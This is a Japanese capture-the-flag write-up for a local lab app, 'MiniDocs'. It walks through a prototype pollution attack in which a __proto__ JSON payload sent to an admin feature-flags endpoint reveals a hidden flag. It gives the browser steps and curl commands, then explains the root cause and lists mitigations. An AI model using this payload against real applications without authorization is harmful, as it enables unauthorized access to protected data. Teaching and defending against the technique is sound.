# MiniDocs — Prototype Pollution（中級）ブラウザ解法

## 解法（ブラウザ）

### 1) `/admin` の “feature-flags” 画面へ
- **前提**：管理者でログイン済み（IDOR で入手したパスワードを使用）。
- **URL欄**：`http://127.0.0.1:8000/admin`
- **画面名**：「Admin」
- 上部カード **「設定変更」** に `patch (JSON)` テキストエリアと **Apply** ボタンがある（送信先：`POST /admin/feature-flags`）。

### 2) フォーム/リクエストの JSON 形式
- サーバは本文を **JSON / URLエンコード両対応**で受理し、`json` フィールドをパースして `patch` として扱う。
- 受理される**ルートキー**は `limits` と `featureFlags` のみ（allow-list）。
- **正攻法の拒否**：`{"featureFlags":{"revealSecret":true}}` のように直接 `revealSecret` を指定しても、サーバ側で削除される（“システム専用フラグ”）。

### 3) 送信ペイロード（PoC）
```json
{"featureFlags":{"__proto__":{"revealSecret":true}}}
```
- **狙い**：脆弱な `deepMerge` が **`__proto__` をそのまま潜る**ため、`Object.prototype.revealSecret = true` が汚染される。  
- 以降、UI は `RUNTIME.featureFlags.revealSecret` を**素朴に参照**するので、prototype 由来でも真と解釈される。

### 4) 送信後の画面変化と `<FLAG_PP>` の確認箇所
1. **Apply** で送信後、`/admin` に 302 リダイレクト。
2. 管理画面下部カード **「現在の設定」** の Diagnostics JSON に注目：  
   - `secretPreview` が **`"(hidden)" → "<FLAG_PP>"`** へ変化している。  
   - ここに `<FLAG_PP>` が可視化される（*「どこで見えるか」=「現在の設定」カードの JSON 表示部*）。

### つまずきポイント / 代替ルート
- **直接指定は無効**：`{"featureFlags":{"revealSecret":true}}` は受理されても**削除**され効果なし。`__proto__` 経由のみ成功。  
- **送信形式**：テキストエリアの通常フォーム送信（URLエンコード）でも、`Content-Type: application/json` でも成立。

---

## 付録：curl 参考（数行）
> 先に **admin** でログインして Cookie を取得しておくこと。フラグの実文字列は表示しない。

```bash
# 1) admin でログイン
curl -s -c c.txt -d 'user=admin&pass=<hidden>' http://127.0.0.1:8000/login > /dev/null

# 2) __proto__ 汚染を JSON で適用（/admin/feature-flags）
curl -s -b c.txt -H 'Content-Type: application/json'   -d '{"featureFlags":{"__proto__":{"revealSecret":true}}}'   http://127.0.0.1:8000/admin/feature-flags > /dev/null

# 3) Diagnostics で secretPreview の露出を確認
curl -s -b c.txt http://127.0.0.1:8000/admin | grep -A2 '"secretPreview"'   # => "<FLAG_PP>"
```

---

## 根本原因と対策（Prototype Pollution）
- **原因**：再帰マージ `deepMerge` が **`__proto__`/`prototype`/`constructor`** を**ブロックせず**に潜るため、`Object.prototype` が汚染される。UI 側も `ownProperty` 判定をせず素朴に参照。  
- **対策（最小）**：
  - ① マージ前に **危険キー拒否**（`['__proto__','prototype','constructor']` を除去）。  
  - ② ライブラリ利用時は **proto 汚染無効化オプション**を有効化。  
  - ③ 参照側も **`Object.hasOwn` / `hasOwnProperty`** で自前プロパティのみ採用する二重防御。
